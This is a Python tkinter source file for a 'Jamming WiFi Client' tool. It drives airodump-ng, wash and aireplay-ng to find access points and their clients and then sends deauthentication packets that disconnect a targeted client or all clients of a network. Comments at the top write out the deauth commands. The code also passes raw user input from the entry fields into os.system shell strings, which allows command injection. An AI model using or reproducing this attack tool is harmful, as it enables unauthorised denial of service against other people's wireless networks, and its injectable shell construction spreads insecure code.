from tkinter import *
import subprocess
import os

	#>>airodump-ng wlan0mon
	#>>airodump-ng -c 1 --bssid<of AP> wlan0mon
	#>>iwconfig wlan0mon channel [channel number]
	#>>aireplay-ng -0(deauthentication) 0 0(Number of Deauth Packets) -a <BSSID of AP To Kill All Clients> wlan0mon
	#>>aireplay-ng -0(deauthentication) 0 0(Times) -a <BSSID of AP To Kill> -c <BSSID of Clients  To Kill> wlan0mon

def Home():
	window.destroy() #close this tkinter GUI
	cmd = "python main.py"
	os.system(cmd)

def ChannelChange():
	cmd0 = "gnome-terminal --command='"'bash -c "'"sudo iwconfig "+devicelist.get()+" channel "
	cmd1 = str(e3.get()) #str() converting e3.get() to string cmd1
	cmd2 = ";sleep 1"'"'"'"
	cmd3 = cmd0+cmd1+cmd2
	os.system(cmd3)

def Clients():
	cmd0 = "gnome-terminal --command='"'bash -c "'"sudo airodump-ng --channel "
	cmd1 = str(e3.get()) #str() converting e3.get() to string cmd1
	cmd2 = " --bssid "
	cmd3 = str(e1.get()) #str() converting e4.get() to string cmd3
	cmd4 = " "+devicelist.get()+"; sleep 600"'"'"'"
	cmd5 = cmd0+cmd1+cmd2+cmd3+cmd4
	os.system(cmd5)

def Run(): #a function to for jammming a client
	ChannelChange();
	cmd0 = "gnome-terminal --command='"'bash -c "'""
	cmd1 = "sudo aireplay-ng -0 "
	cmd2 = str(e2.get())
	cmd3 = " -a "
	cmd4 = str(e1.get())
	cmd5 = " -c "
	cmd6 = str(e4.get())
	cmd7 = " "+devicelist.get()+"; sleep "
	cmd8 = str(e2.get())
	cmd9 = ""'"'"'"
	cmd10 = cmd0+cmd1+cmd2+cmd3+cmd4+cmd5+cmd6+cmd7+cmd8+cmd9
	os.system(cmd10)


def Clear(): # a function to clear the Entry Widget Content
	e1.delete(0, END)
	e2.delete(0, END)
	e3.delete(0, END)
	e4.delete(0, END)

def Scan():
	cmd="gnome-terminal --command='"'bash -c "'"sudo wash -i "+devicelist.get()+" -a; sleep 120"'"'"'"
	os.system(cmd)

window = Tk()

window.title('Jamming WiFi Client')
#window.geometry("350x90+10+20")

icon = PhotoImage(file='icon.png') # Use your PNG file here
window.iconphoto(True, icon)

##################################################
option = os.listdir('/sys/class/net/')

devicelist = StringVar()

for i in range(len(option)):
	if (option[i] == 'wlan0mon'):
		devicelist.set('wlan0mon')
		break
	else:
		devicelist.set("Select Adapter")
#devicelist.get()	#this is used to get dropdown menu seleted item's string
device = OptionMenu(window, devicelist, *option)
#device.config(width=42)
device.grid(row=0, column=1, pady=2)
##################################################

lbl1 = Label(window, text="Enter BSSID of AP     ")
lbl1.grid(row=1,column=0)

lbl2 = Label(window, text="Enter Time(sec)        ")
lbl2.grid(row=2,column=0)

lbl3 = Label(window, text="Enter WiFi Channel   ")
lbl3.grid(row=3,column=0)

lbl4 = Label(window, text="Enter BSSID of Client")
lbl4.grid(row=4,column=0, pady=4)

e1 = Entry(window)
e1.grid(row=1, column=1)

e2 = Entry(window)
e2.grid(row=2, column=1)

e3 = Entry(window)
e3.grid(row=3, column=1)

e4 = Entry(window)
e4.grid(row=4, column=1, pady=4)

quit = Button(window, text='Quit', command=window.quit) #window.quit close current window
quit.grid(row=2, column=2, ipadx=11, pady=4) #sticky=window.W,

home = Button(window, text='Home', command=Home)
home.grid(row=1, column=2, ipadx=5 ,pady=4) #sticky=window.W,

run = Button(window, text='Run', command=Run)
run.grid(row=5, column=1, ipadx=30, pady=4) #sticky=window.W,

clear = Button(window,text="Clear", command=Clear) #button to clear the Entry Widget
clear.grid(row=4, column=2, ipadx=8, pady=4) #sticky=window.W,

clients = Button(window,text="Clients", command=Clients) #button to clear the Entry Widget
clients.grid(row=3, column=2, ipadx=2, pady=4) #sticky=window.W,

Scan = Button(window,text="Scan", command=Scan) #button to clear the Entry Widget
Scan.grid(row=5, column=2, ipadx=10, pady=4) #sticky=window.W,

window.mainloop()

